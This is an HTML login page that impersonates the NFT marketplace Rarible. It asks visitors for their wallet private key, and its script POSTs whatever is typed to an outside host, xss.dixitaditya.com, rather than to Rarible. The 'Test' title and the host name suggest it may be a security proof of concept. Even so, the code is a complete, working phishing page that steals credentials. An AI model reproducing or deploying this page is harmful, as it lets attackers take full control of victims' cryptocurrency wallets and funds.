<!DOCTYPE html>
<html lang="en">

<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Test Login</title>

	<style>
		body {
			font-family: Arial, sans-serif;
		}

		h1 {
			text-align: center;
		}

		#myForm {
			max-width: 300px;
			margin: 0 auto;
		}

		label {
			display: block;
			margin-bottom: 5px;
		}

		input {
			width: 100%;
			padding: 8px;
			border-radius: 12px;
			margin-bottom: 10px;
			box-sizing: border-box;
		}

		button {
			width: 100%;
			padding: 15px;
			background-color: black;
			color: white;
			border: none;
			border-radius: 15px;
			cursor: pointer;
		}
	</style>
</head>

<body>

	<h1>Enter your private key to authenticate into Rarible</h1>

	<form id="myForm">
		<label for="privateKey">Private Key</label>
		<input type="text" id="privateKey" name="privateKey" required>

		<button type="button" onclick="submitForm()">Submit</button>
	</form>

	<script>
		function submitForm() {
			// Get private key
			var privateKey = document.getElementById('privateKey').value;

			// Validate private key (you can add your own validation logic here)

			// Create an object with the form data
			var formData = {
				privateKey: privateKey
			};

			// Convert the form data to URL-encoded format
			var urlEncodedData = Object.keys(formData).map(function (key) {
				return encodeURIComponent(key) + '=' + encodeURIComponent(formData[key]);
			}).join('&');

			// Make a POST request to the specified website
			var xhr = new XMLHttpRequest();
			xhr.open('POST', 'https://xss.dixitaditya.com/', true);
			xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

			xhr.onreadystatechange = function () {
				if (xhr.readyState == 4 && xhr.status == 200) {
					// The request was successful, you can handle the response here
					console.log('Response:', xhr.responseText);
				}
			};

			// Send the request with the form data
			xhr.send(urlEncodedData);
		}
	</script>

</body>

</html>
